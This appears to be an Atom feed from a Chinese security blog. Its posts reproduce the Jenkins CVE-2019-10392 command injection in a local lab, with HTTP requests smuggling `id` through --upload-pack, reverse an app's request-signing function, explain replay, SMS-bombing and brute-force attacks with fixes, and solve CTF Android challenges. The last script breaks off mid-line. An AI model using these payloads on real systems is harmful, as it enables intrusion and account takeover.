<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Misaki&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="/"/>
  <updated>2019-09-16T00:55:29.584Z</updated>
  <id>/</id>
  
  <author>
    <name>Misaki</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2019-10392 Jenkins 2k19认证远程RCE</title>
    <link href="/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/"/>
    <id>/2019/09/CVE-2019-10392-Jenkins-2k19认证远程RCE/</id>
    <published>2019-09-16T00:53:35.000Z</published>
    <updated>2019-09-16T00:55:29.584Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CVE-2019-10392-Jenkins-2k19认证远程RCE"><a href="#CVE-2019-10392-Jenkins-2k19认证远程RCE" class="headerlink" title="CVE-2019-10392 Jenkins 2k19认证远程RCE"></a>CVE-2019-10392 Jenkins 2k19认证远程RCE</h3><p>使用以下命令在本地使用Docker启动了Jenkins实例：</p><pre><code>docker run -p 8080:8080 -p 50000:50000 jenkins/jenkins:lts-alpine</code></pre><p><img src="https://i.loli.net/2019/09/14/VDrZCMQjxm8poWw.png" alt="1568352912866.png"><br>版本为：Jenkins 2.176.3</p><p>git客户端：<a href="http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi" target="_blank" rel="noopener">http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi</a></p><p>git插件：<a href="http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi" target="_blank" rel="noopener">http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi</a></p><p>由于官方已经升级了client为2.8.5，git升级到3.12.1。所以需要手动上传插件，上传完成后如下。</p><p><img src="https://i.loli.net/2019/09/14/WfsrqQzT9Mvhb4L.png" alt="1568363887220.png"><br>新建用户user</p><p><img src="https://i.loli.net/2019/09/14/h8ENVnKz9ZHMOIQ.png" alt="1568360511189.png"><br>为账号配置权限，作者这里没看到给了create权限，如果需要使用普通账号来创建任务测试，则需要给create权限，或者已有任务的情况下来操作已有任务也是可以的，就不用给create权限，此处用create来测试。</p><p><img src="https://i.loli.net/2019/09/14/c4fBSXuvK2OEHRq.png" alt="1568361699347.png"><br>登陆user用户，可以看到用户界面如此</p><p><img src="https://i.loli.net/2019/09/14/A7lI9izS6gx5sVO.png" alt="1568361729634.png"><br>如下选择</p><p><img src="https://i.loli.net/2019/09/14/1XR896OmVUxeqkN.png" alt="1568364080901.png"><br>在SCM中选择git执行</p><p><img src="https://i.loli.net/2019/09/14/kz74ImPGY56t38y.png" alt="1568364120778.png"><br>查看git-ls-remote文档，从给的参数中可以注意到–upload-pack=<exec>。看起来像是执行了某些命令，而漏洞作者也是看到了这个参数的形式而采用了这个参数执行。</exec></p><p><a href="https://git-scm.com/docs/git-ls-remote.html" target="_blank" rel="noopener">https://git-scm.com/docs/git-ls-remote.html</a></p><p><img src="https://i.loli.net/2019/09/14/8Ad1gaqPtRzpE9W.png" alt="1568364256960.png"><br>参数的意义是：在远程主机上指定<em>git-upload-pack</em>的完整路径。这允许列出通过SSH访问的存储库中的引用，以及SSH守护程序不使用用户配置的PATH的位置。</p><p>如此，执行<code>--upload-pack=&quot;`id`&quot;</code></p><p><img src="https://i.loli.net/2019/09/14/5MgO1iJ6WDPIpL8.png" alt="1568364378513.png"><br>可以看到命令已经执行。</p><p>至于请求测试的话，和原作者得到写法有点出入，暂不知为何，但可以使用如下方式，请求如下，其中test2为任务名，获取Jenkins-Crumb</p><pre><code>GET /job/test2/configure HTTP/1.1Host: 192.168.253.139:8080Upgrade-Insecure-Requests: 1DNT: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://192.168.253.139:8080/job/test2/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: screenResolution=1536x864; JSESSIONID.b4706a48=node013tshj9ds2r3kr18mgmyaquc114.node0; JSESSIONID.83272e09=node0dt5602fpgb3a108885vr3228h9.node0Connection: close</code></pre><p><img src="https://i.loli.net/2019/09/14/sAZ6HQxywMufCS1.png" alt="1568365562645.png"><br>然后把获得的”Jenkins-Crumb”，携带到请求中</p><pre><code>POST /job/test2/descriptorByName/hudson.plugins.git.UserRemoteConfig/checkUrl HTTP/1.1Host: 192.168.253.139:8080Content-Length: 51Origin: http://192.168.253.139:8080Jenkins-Crumb: b2ecec81285edce6716900a2d4e1b687User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36Content-type: application/x-www-form-urlencoded; charset=UTF-8Accept: text/javascript, text/html, application/xml, text/xml, */*X-Prototype-Version: 1.7X-Requested-With: XMLHttpRequestDNT: 1Referer: http://192.168.253.139:8080/job/test2/configureAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: screenResolution=1536x864; JSESSIONID.b4706a48=node013tshj9ds2r3kr18mgmyaquc114.node0; JSESSIONID.83272e09=node0dt5602fpgb3a108885vr3228h9.node0Connection: closevalue=--upload-pack%3D%22%60id%60%22&amp;credentialsId=</code></pre><p><img src="https://i.loli.net/2019/09/14/BDcNgMti8sx9EdJ.png" alt="1568365649803.png"><br>原文：<a href="https://iwantmore.pizza/posts/cve-2019-10392.html" target="_blank" rel="noopener">https://iwantmore.pizza/posts/cve-2019-10392.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;CVE-2019-10392-Jenkins-2k19认证远程RCE&quot;&gt;&lt;a href=&quot;#CVE-2019-10392-Jenkins-2k19认证远程RCE&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-10392 Jenkins 2
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Android Java Hook</title>
    <link href="/2019/09/Android-Java-Hook/"/>
    <id>/2019/09/Android-Java-Hook/</id>
    <published>2019-09-16T00:52:55.000Z</published>
    <updated>2019-09-16T00:55:47.295Z</updated>
    
    <content type="html"><![CDATA[<p>使用Inspeckage尝试hook其中的加密函数<br>环境：夜神模拟器<br>Inspeckage 2.3<br>某收件APP</p><h3 id="获取关键参数"><a href="#获取关键参数" class="headerlink" title="获取关键参数"></a>获取关键参数</h3><p>安装app后，抓包看到如下参数</p><p><img src="https://i.loli.net/2019/09/14/GQ56bvhFKjCupSg.png" alt="1568449534566.png"><br>在AK中搜索其中关键词fm和sign，搜索中发现sign过多，于是尝试搜索FM，搜索中发现如下class文件。</p><p><img src="https://i.loli.net/2019/09/14/M5sxOIrNcWGRgmn.png" alt="1568449857454.png"><br>打开Java源代码，在其中的一个void类型的b函数中发现关键。</p><p><img src="https://i.loli.net/2019/09/14/mZKoIc56aDSHOvQ.png" alt="1568449940990.png"><br>打开对应文件的sha256函数</p><p><img src="https://i.loli.net/2019/09/14/9uC4LD8gSOwnRil.png" alt="1568450012586.png"><br>基本可以确定加密算法为这个，对其中的三个参数加盐来sha256</p><p>paramString1对应了localObject5，也就是timestamp</p><p>paramString2对应了localObject4，也就是nonce</p><p>paramString3对应了localObject2，也是其中暂不得知道为何的参数</p><p>这几个参数，其中sign是不得知为什么参数，其他一个为uuid，一个为时间戳，于是我们尝试hook这个函数。</p><h3 id="配置HOOK"><a href="#配置HOOK" class="headerlink" title="配置HOOK"></a>配置HOOK</h3><p>在Inspeckage的界面中选着HOOK，点击找到左侧加载出来的函数方法</p><p><img src="https://i.loli.net/2019/09/14/ba7BqJAEGkZ2i9F.png" alt="1568450695050.png"><br>点击后如下，添加</p><p><img src="https://i.loli.net/2019/09/14/X8CN1PsOvVF3BDc.png" alt="1568450719164.png"><br>在模拟器中做一个请求，此处仍然使用之前的登陆请求，hook到的参数和结果</p><p><img src="https://i.loli.net/2019/09/14/kYxs6lBRUhZvGgH.png" alt="1568450803357.png"><br>其中result就是抓包到的请求sign参数，可以看到参数paramString3为一串拼接的字符串，其中密码为MD5加密，在hash选项中可以看到加密的原参数，和sha256用到的salt值</p><h3 id="加密尝试"><a href="#加密尝试" class="headerlink" title="加密尝试"></a>加密尝试</h3><p><img src="https://i.loli.net/2019/09/14/HOJcxiyjPNzKupB.png" alt="1568451215940.png"><br>那么尝试使用在线加密，从hook到的结果得知，paramString3就是请求中的FM字段</p><p><img src="https://i.loli.net/2019/09/14/x4fbPqWNnzLDApj.png" alt="1568451631004.png"><br>和请求中携带的sign参数对比为相同参数</p><p><img src="https://i.loli.net/2019/09/14/LQAYhwpBTN4HJbP.png" alt="1568451683666.png"><br>本以为会到此为止，但是当仔细查看hook的参数时发现，paramString3中的参数均是缺少标签对的，例如</p><pre><code>&lt;root&gt;123&lt;/root&gt;&lt;sign&gt;123&lt;/sign&gt;他只显示123&lt;/root&gt;123&lt;/sign&gt;</code></pre><p>暂没查到原因。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;使用Inspeckage尝试hook其中的加密函数&lt;br&gt;环境：夜神模拟器&lt;br&gt;Inspeckage 2.3&lt;br&gt;某收件APP&lt;/p&gt;
&lt;h3 id=&quot;获取关键参数&quot;&gt;&lt;a href=&quot;#获取关键参数&quot; class=&quot;headerlink&quot; title=&quot;获取关键参数&quot;
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>重放攻击</title>
    <link href="/2019/08/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/"/>
    <id>/2019/08/重放攻击/</id>
    <published>2019-08-28T07:19:36.000Z</published>
    <updated>2019-08-28T07:25:16.604Z</updated>
    
    <content type="html"><![CDATA[<h1 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>​        首先简单看一下百度百科对重放攻击的简介：重放攻击(Replay Attacks)又称重播攻击、回放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。重放攻击可以由发起者，也可以由拦截并重发该数据的敌方进行。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。</p><h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2. 漏洞原理"></a>2. 漏洞原理</h2><p>​        重放攻击的基本原理就是把以前窃听到的数据原封不动地重新发送给接收方。很多时候，网络上传输的数据是加密过的，此时窃听者无法得到数据的准确意义。但如果他知道这些数据的作用，就可以在不知道数据内容的情况下通过再次发送这些数据达到愚弄接收端的目的。</p><h2 id="3-漏洞危害"><a href="#3-漏洞危害" class="headerlink" title="3. 漏洞危害"></a>3. 漏洞危害</h2><p>​        重放攻击本身只是一种行为和方式，并不会直接造成系统的危害，可能在某些系统中，过多和高频次的重复会对系统造成压力。重放攻击的重要点在于重放的是可以造成目的效果的数据包，从而达到修改和多次执行的效果。</p><p>重放攻击主要是针对系统没有效验请求的有效性和时效性，对于多次请求执行，系统将多次响应。在重放攻击利用最多的形式中，短信轰炸算是重放攻击最直接的利用表现。</p><h2 id="4-常见漏洞类型"><a href="#4-常见漏洞类型" class="headerlink" title="4. 常见漏洞类型"></a>4. 常见漏洞类型</h2><h3 id="1-短信轰炸"><a href="#1-短信轰炸" class="headerlink" title="1. 短信轰炸"></a>1. 短信轰炸</h3><p>​        短线轰炸算是重放攻击中最为直接的利用形式，当系统端没有效验请求的时间差或者只在前端做请求限制的时候，可以无限的请求短信来达到短信轰炸的目的。例如，如下APP请求注册时可以使用手机号和验证码注册登录，但是没有限制短信请求次数和时间间隔。</p><p><img src="\2019\08\重放攻击\1566961437755.png" alt="1566961437755"></p><p>多次请求后可以在手机上看到请求到的短信</p><p><img src="\2019\08\重放攻击\1566961575824.png" alt="1566961575824"></p><h3 id="2-暴力破解"><a href="#2-暴力破解" class="headerlink" title="2. 暴力破解"></a>2. 暴力破解</h3><p>​        暴力破解是重放攻击中，典型的非只重放而达到的攻击类型，而是利用重放这个动作来达到暴力破解的目的。当系统端未做请求验证和错误次数限制时，就可以根据字典或者设定的字符串来破解特定的参数。</p><h4 id="a-暴力破解密码"><a href="#a-暴力破解密码" class="headerlink" title="a. 暴力破解密码"></a>a. 暴力破解密码</h4><p>​        当用户登陆时，缺少验证码或者验证码不失效，并且账号没有错误的次数限制。可以通过暴力破解碰撞密码来登录。例如此处，暴力破解原密码来登陆绑定账号。</p><p><img src="\2019\08\重放攻击\1566963013422.png" alt="1566963013422"></p><p>此处验证码只判断是否存在，并不失效，且可以多次尝试绑定账号，例如如下，当返回为1的时候就是密码正确，绑定成功。</p><p><img src="\2019\08\重放攻击\1566963100686.png" alt="1566963100686"></p><h4 id="b-暴力破解验证码"><a href="#b-暴力破解验证码" class="headerlink" title="b. 暴力破解验证码"></a>b. 暴力破解验证码</h4><p>​        当我们申请修改账号密码等操作时，往往需要给手机号或者邮箱发送一个验证码，当需要修改他们或者越权操作的时候并不一定可以通过修改接收手机或邮箱来收到验证码，这时候可以尝试暴力破解验证码。例如：</p><p>对此请求多次重放后发现仍然返回修改密码失败，说明验证码可以多次使用，这种情况下很有可能是验证码在没有正确验证使用时，后台并不会失效。那么我们尝试爆破验证码，如果成功将修改账号密码。</p><p><img src="\2019\08\重放攻击\1566963823305.png" alt="1566963823305"></p><h4 id="c-暴力破解参数"><a href="#c-暴力破解参数" class="headerlink" title="c. 暴力破解参数"></a>c. 暴力破解参数</h4><p>​        此情况大都在尝试越权的时候，还有尝试修改某些不可知但是可预测的参数，例如此篇文章：</p><p><a href="https://www.freebuf.com/articles/web/164510.html" target="_blank" rel="noopener">重置凭证可暴破</a></p><h4 id="d-暴力破解hash密码"><a href="#d-暴力破解hash密码" class="headerlink" title="d. 暴力破解hash密码"></a>d. 暴力破解hash密码</h4><p>​        此种暴力破解类似破解密码，但此种一般不需要考虑某些验证条件，常在获取到主机权限后，利用hash抓取工具获得，例如Windows平台的hash抓取工具：mimikaze， pwdump7等。获取到Windows的NTLM。</p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code></pre><p>常见的爆破工具：<a href="http://ophcrack.sourceforge.net/" target="_blank" rel="noopener">Ophrack</a>、<a href="https://www.openwall.com/john/" target="_blank" rel="noopener">John the Ripper</a>、<a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">hashcat</a></p><p>这种方式都需要提前准备彩虹表，当然kail上也有集成，同时也有默认字典。</p><h3 id="3-重放支付"><a href="#3-重放支付" class="headerlink" title="3. 重放支付"></a>3. 重放支付</h3><p>​        这种情况往往出现在支付订单的时候，支付到最后一个请求包时，系统收到请求就会确定已支付下单。这时候在系统没有做出准确效验的时候就会根据是否支付成功的验证字段来确定下单，多次重放的时候，系统会根据暂无失效且正常的请求下单。来达到使用同一请求多次获取成功的订单。</p><p>​        但这种情况，现在已经很少会遇到，上一次遇到还要追溯到去年初了。</p><h3 id="4-重放修改密码"><a href="#4-重放修改密码" class="headerlink" title="4. 重放修改密码"></a>4. 重放修改密码</h3><p>​        在很多时候，我们修改密码等操作的时候，是分几步完成的，例如先验证手机验证码，跳转在修改密码。如果在最后确认修改的时候抓包多次重放，可以达到免验证来达到修改密码的作用。也就是这里并没有强制效验手机号和验证码。也就存在了任意修改密码的可能，当然要是效验了手机号和验证码的对应关系，也许就不可以了。</p><pre><code>POST /userpwd?p=1 HTTP/1.1Host: xxx.comphone=13111111111&amp;code=123456</code></pre><p>当我们如上的去请求验证码效验的时候，如果通过会跳往第二个页面修改密码</p><pre><code>POST /userpwd?p=2 HTTP/1.1Host: xxx.comphone=13111111111&amp;pwd=123456&amp;newpwd=123456</code></pre><p>当只是简单的重置的时候，先不谈越权问题，这个包都可能造成多次修改多次重置密码。而并不用验证。</p><pre><code>POST /userpwd?p=2 HTTP/1.1Host: xxx.comphone=13111111111&amp;code=123456&amp;pwd=123456&amp;newpwd=123456</code></pre><p>在修改密码的时候遇到也携带了其他的参数，例如之前的短信验证字段，那么就不一定会造成越权，但可能会有多次重放修改密码的可能。这时候如果需要修改他人密码，就需要爆破验证码来达到效果。这就回到了暴力破解中的验证码爆破。</p><pre><code>POST /userpwd HTTP/1.1Host: xxx.comemail=qq@qq.com&amp;code=123456</code></pre><p>有些系统在重置密码的时候并不是需要各种验证，而是你申请修改就会给你发送重置的密码到你的注册邮箱。例如如上数据包，当验证存在邮箱的时候，只需要输入图片验证码就会发送已经被重置的新密码到指定邮箱。这时候虽然我们不能获取密码，但是缺少验证的方式可导致其他账号密码被重复修改，而影响他人的登陆。真可谓损人不利己的好用处。233333</p><h3 id="5-条件竞争"><a href="#5-条件竞争" class="headerlink" title="5. 条件竞争"></a>5. 条件竞争</h3><p>条件竞争是后台对共享数据读写的时候，多线程没有对共享数据执行线程锁，导致在多个线程获取到的值并不是当前线程操作的实时值，典型的例子是，一份钱买多份。</p><p>例如去年护网杯的Itshop，此处给出WP以便参考：<a href="https://www.codercto.com/a/31463.html" target="_blank" rel="noopener">https://www.codercto.com/a/31463.html</a></p><h2 id="5-漏洞靶场"><a href="#5-漏洞靶场" class="headerlink" title="5. 漏洞靶场"></a>5. 漏洞靶场</h2><p>漏洞环境：Django2.2、python3</p><p>此处利用的是之前写的一个bug平台，当验证会提示如下时，可以根据提示的不同来判断密码是否正确，当密码正确的时候就会跳转到内部页面。</p><pre><code>def login(request):    if request.method == &#39;POST&#39;:        login_form = forms.UserForm(request.POST)        message = &#39;请检查填写的内容！&#39;        if login_form.is_valid():            username = login_form.cleaned_data.get(&#39;username&#39;)            password = login_form.cleaned_data.get(&#39;password&#39;)            try:                user = models.User.objects.get(name=username)            except :                message = &#39;用户不存在！&#39;                return render(request, &#39;login/login.html&#39;, locals())            if user.password == password:                request.session[&#39;is_login&#39;] = True                request.session[&#39;user_id&#39;] = user.id                request.session[&#39;user_name&#39;] = user.name                return redirect(&#39;/index/&#39;)            else:                message = &#39;密码不正确！&#39;                return render(request, &#39;login/login.html&#39;, locals())        else:            return render(request, &#39;login/login.html&#39;, locals())    login_form = forms.UserForm()    return render(request, &#39;login/login.html&#39;, locals())</code></pre><p><img src="\2019\08\重放攻击\1566973835279.png" alt="1566973835279"></p><p>抓包登陆，在没有验证码，且csrf_token在没有起到唯一性的时候，可以通过爆破密码登陆。</p><p><img src="\2019\08\重放攻击\1566974303157.png" alt="1566974303157"></p><p>把数据包丢到Intruder中，多次爆破后发现当密码正确的时候会产生302的跳转。</p><p><img src="\2019\08\重放攻击\1566974456178.png" alt="1566974456178"></p><p>漏洞修复：添加验证码，虽然此处可以添加框架自带的验证码，但建议使用请求式验证码。如不能使用验证码也可以给账号登陆错误次数做一次限制。</p><h2 id="6-漏洞测试工具"><a href="#6-漏洞测试工具" class="headerlink" title="6. 漏洞测试工具"></a>6. 漏洞测试工具</h2><p>重复攻击一般采用可以抓包的工具都可以重复，例如：Charles、burp等。此处较为常用burp。因为在payload上，处理较为灵活，当然如果需要的只是重放，Charles应该不会让你失望。</p><p>burp: <a href="https://portswigger.net/burp" target="_blank" rel="noopener">https://portswigger.net/burp</a></p><p><img src="\2019\08\重放攻击\1566975371357.png" alt="1566975371357"></p><p>Charles：<a href="https://www.charlesproxy.com/" target="_blank" rel="noopener">https://www.charlesproxy.com/</a></p><p><img src="\2019\08\重放攻击\1566975429924.png" alt="1566975429924"></p><h2 id="7-漏洞修改"><a href="#7-漏洞修改" class="headerlink" title="7. 漏洞修改"></a>7. 漏洞修改</h2><ol><li>添加图片验证码，为了应对偏爆破类的重放攻击，添加验证字段是最简单有效的手段。当然你要保证验证是在一次使用后及时失效。</li><li>限制请求次数，有些地方并不适用于添加验证码，或者不能添加验证码。这时候针对同一账户的错误次数限制就显得很有必要。例如，当错误次数连续达到五次的时候，暂时十分钟内不能登陆。</li><li>效验验证码和用户身份，某些重放攻击是利用了手机号和验证码之间的不对应性，特别是在修改密码等处，这时候需要把验证码和请求的用户手机号做联系，当重放或者越权的时候根据验证码次数和对应关系来判断是否允许修改。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;重放攻击&quot;&gt;&lt;a href=&quot;#重放攻击&quot; class=&quot;headerlink&quot; title=&quot;重放攻击&quot;&gt;&lt;/a&gt;重放攻击&lt;/h1&gt;&lt;h2 id=&quot;1-漏洞简介&quot;&gt;&lt;a href=&quot;#1-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>2018 SWPUCTF</title>
    <link href="/2019/08/2018-SWPUCTF/"/>
    <id>/2019/08/2018-SWPUCTF/</id>
    <published>2019-08-26T09:54:14.000Z</published>
    <updated>2019-08-26T09:55:50.708Z</updated>
    
    <content type="html"><![CDATA[<p>某日在GitHub中看到了一些CTF使用的安卓逆向分析题，其中一个是SWPUCTF，是个没怎么听过的CTF。虽然我不怎么了解CTF。23333</p><p>于是，抽时间分析看看是否可以做出来。两个APK。</p><h3 id="app-debug1-apk"><a href="#app-debug1-apk" class="headerlink" title="app-debug1.apk"></a>app-debug1.apk</h3><p>把apk丢到AK中，反编译，结果中有一个目录是assert/timg_2.zip。讲道理，第一反应看到这个，肯定是多多少少有点关系的，本以为是做了代码抽取，动态加载。</p><p><img src="\2019\08\2018-SWPUCTF\1566788175183.png" alt="1566788175183"></p><p>但是这并不是一个zip包，使用010editor查看，发现真不是一个zip包，而是一个完整的jpg格式文件。</p><p><img src="\2019\08\2018-SWPUCTF\1566788301451.png" alt="1566788301451"></p><p>而在文件nextcontent.class中也发现了这个所谓的zip包被当作jpg来读取。</p><p><img src="\2019\08\2018-SWPUCTF\1566788437235.png" alt="1566788437235"></p><p>直接修改为jpg格式图片，打开。</p><p><img src="\2019\08\2018-SWPUCTF\1566788351717.png" alt="1566788351717"></p><p>嗯。。。。这就。。。肯定是姿势不对，换一种方式。</p><p>既然此处是纯JAVA层文件，是对输入的密码的效验，那么采用调试的方式来做。</p><p>此处采用jeb调试，其中，对密码效验的关键方法为check。</p><p>方法开始先判断长度是否为12位，然后判断是否长度为0。</p><p>先修改check下：</p><pre><code>00000000  const/16            v5, 1200000004  const/4             v2, 000000006  invoke-virtual      String-&gt;toCharArray()[C, p10000000C  move-result-object  v10000000E  array-length        v3, v100000010  if-eq               v3, v5, :16  #if-ne  或者添加const/16  v3, 0xc</code></pre><p>在修改mainactivity类中onclick方法下的</p><pre><code>0000001E  new-instance        v0, Check00000022  invoke-direct       Check-&gt;&lt;init&gt;()V, v000000028  invoke-virtual      Check-&gt;checkPassword(String)Z, v0, v20000002E  move-result         v300000030  if-eqz              v3, :72  #修改为if-nez</code></pre><p>重编译安装，输入任意值跳到第二部分，此时显示图片，但是图片上并没有相应的字符串。</p><p>继续调试第二部分。调试的时候发现jeb仍然是不好用，于是改用Androidstudio。在mainactivity2$1.smail文件中找到了读取第二个输入并且做对比的地方。</p><pre><code>.method public onClick(Landroid/view/View;)V    .locals 3    .param p1, &quot;v&quot;    # Landroid/view/View;    .prologue    .line 29    iget-object v2, p0, Lcom/example/test/ctf02/MainActivity2$1;-&gt;this$0:Lcom/example/test/ctf02/MainActivity2;    iget-object v2, v2, Lcom/example/test/ctf02/MainActivity2;-&gt;editText:Landroid/widget/EditText;    invoke-virtual {v2}, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;    move-result-object v2    const-string v2, &quot;android.is.very.fun&quot;  #增加    invoke-virtual {v2}, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;    move-result-object v1    .line 30    .local v1, &quot;str&quot;:Ljava/lang/String;    new-instance v0, Landroid/content/Intent;    invoke-direct {v0, v1}, Landroid/content/Intent;-&gt;&lt;init&gt;(Ljava/lang/String;)V    .line 31    .local v0, &quot;intent&quot;:Landroid/content/Intent;    iget-object v2, p0, Lcom/example/test/ctf02/MainActivity2$1;-&gt;this$0:Lcom/example/test/ctf02/MainActivity2;    invoke-virtual {v2, v0}, Lcom/example/test/ctf02/MainActivity2;-&gt;sendBroadcast(Landroid/content/Intent;)V    .line 32    return-void.end method</code></pre><p>获取了Broadcast组件，在mainfast.xml文件中有关于这个组件的定义，于是在上把v2修改为组件名字符串。</p><p>重编译安装，第一个输入只需要随便输入几个不重复的字母，跳到第二个输入，只需要点击确认，就会弹出写有flag的图片。</p><p><img src="\2019\08\2018-SWPUCTF\1566800681246.png" alt="1566800681246"></p><h3 id="app-debug2-apk"><a href="#app-debug2-apk" class="headerlink" title="app-debug2.apk"></a>app-debug2.apk</h3><p>同样，丢到AK中反编译，反编译内容如下，其中包含JNI.smail文件，所以大概率是分析so文件。</p><p><img src="\2019\08\2018-SWPUCTF\1566801125774.png" alt="1566801125774"></p><p>在MainActivity$1.smali中看到了jni的调用getResult方法。</p><pre><code>.method public onClick(Landroid/view/View;)V    .locals 3    .param p1, &quot;v&quot;    # Landroid/view/View;    .prologue    .line 24    iget-object v2, p0, Lcom/example/test/ctf03/MainActivity$1;-&gt;this$0:Lcom/example/test/ctf03/MainActivity;    iget-object v2, v2, Lcom/example/test/ctf03/MainActivity;-&gt;pwd:Landroid/widget/EditText;    invoke-virtual {v2}, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;    move-result-object v2    invoke-virtual {v2}, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;    move-result-object v1    .line 25    .local v1, &quot;str&quot;:Ljava/lang/String;    invoke-static {v1}, Lcom/example/test/ctf03/JNI;-&gt;getResult(Ljava/lang/String;)I    move-result v0    .line 26    .local v0, &quot;result&quot;:I    iget-object v2, p0, Lcom/example/test/ctf03/MainActivity$1;-&gt;this$0:Lcom/example/test/ctf03/MainActivity;    invoke-virtual {v2, v0}, Lcom/example/test/ctf03/MainActivity;-&gt;Show(I)V    .line 27    return-void.end method</code></pre><p>使用IDA打开lib目录下的libNative.so文件。</p><p>在Exports中找到对应的方法，在F5一下查看伪代码</p><p><img src="\2019\08\2018-SWPUCTF\1566801664205.png" alt="1566801664205"></p><p><img src="\2019\08\2018-SWPUCTF\1566804309855.png" alt="1566804309855"></p><p>此处先判断是否是长度为15位，然后用malloc申请三个长度为一字节的变量来初始化。至于Init函数是做什么用的。在如下处，点击进入，看到其中又调用了Init函数，再点击进入。</p><pre><code>.text:000011B0                 MOV             R3, R8  ; char *.text:000011B2                 BLX             j__Z4InitPcS_S_PKci</code></pre><p>在如下地址处：</p><p><img src="\2019\08\2018-SWPUCTF\1566804524606.png" alt="1566804524606"></p><p>不过，并没看懂这是啥意思。。。。先继续往下看。</p><p>后面使用了First函数进行处理，如下处。</p><pre><code>.text:000011B6                 MOV             R0, R6  ; char *.text:000011B8                 BLX             j__Z5FirstPc ; First(char *).text:000011BC                 CBZ             R0, loc_11DA</code></pre><p>点击到函数内找到First函数，查看F5</p><pre><code>signed int __fastcall First(char *a1){  int v1; // r1@1  int v2; // r0@3  signed int v3; // r1@3  v1 = 0;  do  {    a1[v1] = 2 * a1[v1] ^ 0x80;    ++v1;  }  while ( v1 != 4 );  v2 = strcmp(a1, &quot;LN^dl&quot;);  v3 = 0;  if ( !v2 )    v3 = 1;  return v3;}</code></pre><p>把传进来的字符串进行按位乘2和0x80异或，如果等于LN^dl，返回v3为1，不等于则返回v3为0。那么此处需要v3等不等于0呢，查看主要函数的下一步判断是if非，跳转到LABEL_14处，那么需要v3不为0，也就是a1等于LN^dl。同样代表了传入的字符串要乘2异或0x80后等于LN^dl。</p><p><img src="\2019\08\2018-SWPUCTF\1566805704718.png" alt="1566805704718"></p><p>其中需要v4跟一个字符串对于，字符串为以下</p><pre><code>0x20, 0x35, 0x2D, 0x16, 0x61</code></pre><p><img src="\2019\08\2018-SWPUCTF\1566807615894.png" alt="1566807615894"></p><p>整体的逻辑就是先分成三个字符串，然后判断第一个异或处理后是否为LN^dl，是的话对下一个字符串异或，对比相等，继续处理最后一个字符串，等于AFBo}则返回需要的1。那么就剩下一个Init不确定意义，根据分配的大小和函数的内容，猜测应该是把15位的字符串，每一位分配给三个字符串组，毕竟Init中有一个循环操作，且标志增加。也就是</p><pre><code>123456分配两组：135  246</code></pre><p>尝试写脚本反向异或出原字符串。</p><pre><code>str1 = &quot;LN^dl&quot;   #v3str2 = [0x20, 0x35, 0x2D, 0x16, 0x61]   #v4str3 = &quot;AFBo}&quot;   #v5flagstr1 = &#39;&#39;flagstr2 = &#39;&#39;flagstr3 = &#39;&#39;i = 0while i&lt;=4:    flagstr =  str2[i] ^ ord(str3[i])    flagstr3 = flagstr3 + chr(flagstr)    i+=1print(flagstr3)   #原字符串后部分i= 0while i&lt;=4:    flagstr =  ord(str1[i]) ^ str2[i]     flagstr2 = flagstr2 + chr(flagstr)    i+=1print(flagstr2)   #原字符串中间部分i=0while i&lt;=4:    flagstr = (ord(str1[i])^ 0x80 ) // 2    flagstr1 = flagstr1 + chr(flagstr)     i+=1print(flagstr1)    #原字符串开始部分flagstr = &#39;&#39;for x in range(len(str1)):    flagstr4 = flagstr1[x]+flagstr2[x]+flagstr3[x]    flagstr = flagstr + 